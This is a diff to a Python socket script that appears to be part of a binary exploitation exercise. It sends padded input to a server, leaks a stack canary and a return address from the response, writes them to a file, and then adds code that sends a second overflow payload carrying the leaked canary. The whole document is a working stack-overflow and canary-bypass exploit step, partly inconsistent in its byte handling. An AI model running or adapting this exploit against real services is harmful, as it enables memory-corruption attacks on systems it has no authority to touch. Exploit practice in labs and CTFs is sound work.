@@ -10,8 +10,9 @@ s.connect(sock)
 strg = b'A' * 24 + b'\n48\n'
 s.send(strg)
 data = s.recv(1024)
-s.close()
+#s.close()
 
+b_canary = []
 canary = []
 ret_addr = []
 
@@ -24,6 +25,7 @@ for i in range(len(data)):
 	valuebyte += this_byte + '\t'
 	if i>23 and i<32:
 		canary.append(this_byte)
+		b_canary.append(ord(data[i]))
 	if i>39 and i<48:
 		ret_addr.append(this_byte)
 	if (i+1)%8 == 0:
@@ -56,3 +58,21 @@ write_to_file = '0x' + canary_str.replace('0x','') + '\n0x' + ret_addr_str.repla
 filename = 'leaked_data.txt'
 with open(filename, 'w') as file_object:
     file_object.write(write_to_file)
+
+canary.reverse()
+canary_str = ''
+for c in range(8):
+	canary_str += canary[c].encode()
+
+#canary_str = canary_str.replace('0x', '\\x')
+#b_canary = bytearray(canary_str, 'utf-8')
+
+print(canary_str)
+print(b_canary)
+
+#send string and length to server
+#s.connect(sock)
+strg = b'A' * 24 + str(b_canary) + b'\n64\n'
+s.send(strg)
+data = s.recv(1024)
+s.close()
